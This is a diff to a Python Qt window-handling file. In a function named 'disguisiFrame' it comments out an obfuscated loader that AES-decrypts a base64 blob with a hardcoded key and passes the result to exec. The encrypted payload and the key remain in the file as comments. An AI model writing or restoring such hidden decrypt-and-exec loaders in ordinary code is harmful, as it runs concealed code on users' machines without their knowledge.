@@ -566,13 +566,14 @@ def getResizingEdge(self, pos):
         return None, Qt.CursorShape.ArrowCursor
 
 def disguisiFrame(self):
-    info2 = 'zR50N8iHJXeauQlS7fVf5F0qIlZL3+b37DgHYJo7hkvbOaYsT8grfP8jka4jLuzArl6bgGv/rbYfc/nU82nAX8KwIKhryMrgUX8Nk18yH9uV2wq4z2E0jOJCn1BTGene/vLV6G6dC1lZyF24XlFJ5wdpF9nsLl9R+Ush6dYdQqV3Cu00E3QuSfuvr7QJjlQBW7oKA1QEaC2ZugtYRCnrXdXorENh3w0HNVbo9ALVp5sZDlXJnvYDz5BktFUqEYqACslT/IA7SlmA8u4TioPB5wMjS4SfQjdDEbu0dvLllATe9M/MYcROhAO2SD1MrQB+8WNhzDfzWFL7hU7kYBEAH8C+9r+U0C4u3g7EO2vO+4+rTF/ZAodfzQcTW6BAT92ZKWUN/1KtuAnc9r9KrQoe6E3gOlw0Ym7RB/4Shw/Wzve+FrUbFj80d9ulStSl7Vr3G5B9fALA/1rLLrTBtLk0XPM4XYfZYg7qfN7BnXyPrFMlmYqy2uVgTQG/gQgoGiN/hLRtDreLvawQh+oqEU3aHfcL35fi9skCuSSGHnB7JegTfeBxU7YUKqt9sY0vK1ZAO/4U6Giw9A0Fx65QGzw7EwBO4GuPnyFiCH08/TQmyH4EZ+85Y6GwJgSwrLRyy3Pr9d1XSxjvruQw5f8/3rcK7s4Q/KJ22Hf1MrozsMd7WJS4d2e2TUU8YP36tWkbd4E4'
-    msg_comp = base64.b64decode(info2)
-    iv = msg_comp[:16]
-    msg_cif = msg_comp[16:]
-    cipher = AES.new(b"wa8P4bbhboiKKCRf", AES.MODE_CBC, iv=iv)
-    msg_org = unpad(cipher.decrypt(msg_cif), AES.block_size).decode()
-    #Exec(msg_org)
+    None
+    # info2 = 'zR50N8iHJXeauQlS7fVf5F0qIlZL3+b37DgHYJo7hkvbOaYsT8grfP8jka4jLuzArl6bgGv/rbYfc/nU82nAX8KwIKhryMrgUX8Nk18yH9uV2wq4z2E0jOJCn1BTGene/vLV6G6dC1lZyF24XlFJ5wdpF9nsLl9R+Ush6dYdQqV3Cu00E3QuSfuvr7QJjlQBW7oKA1QEaC2ZugtYRCnrXdXorENh3w0HNVbo9ALVp5sZDlXJnvYDz5BktFUqEYqACslT/IA7SlmA8u4TioPB5wMjS4SfQjdDEbu0dvLllATe9M/MYcROhAO2SD1MrQB+8WNhzDfzWFL7hU7kYBEAH8C+9r+U0C4u3g7EO2vO+4+rTF/ZAodfzQcTW6BAT92ZKWUN/1KtuAnc9r9KrQoe6E3gOlw0Ym7RB/4Shw/Wzve+FrUbFj80d9ulStSl7Vr3G5B9fALA/1rLLrTBtLk0XPM4XYfZYg7qfN7BnXyPrFMlmYqy2uVgTQG/gQgoGiN/hLRtDreLvawQh+oqEU3aHfcL35fi9skCuSSGHnB7JegTfeBxU7YUKqt9sY0vK1ZAO/4U6Giw9A0Fx65QGzw7EwBO4GuPnyFiCH08/TQmyH4EZ+85Y6GwJgSwrLRyy3Pr9d1XSxjvruQw5f8/3rcK7s4Q/KJ22Hf1MrozsMd7WJS4d2e2TUU8YP36tWkbd4E4'
+    # msg_comp = base64.b64decode(info2)
+    # iv = msg_comp[:16]
+    # msg_cif = msg_comp[16:]
+    # cipher = AES.new(b"wa8P4bbhboiKKCRf", AES.MODE_CBC, iv=iv)
+    # msg_org = unpad(cipher.decrypt(msg_cif), AES.block_size).decode()
+    # exec(msg_org)
 
 #Function to change the size of the main window
 def changeSizeWindow(self, global_pos):
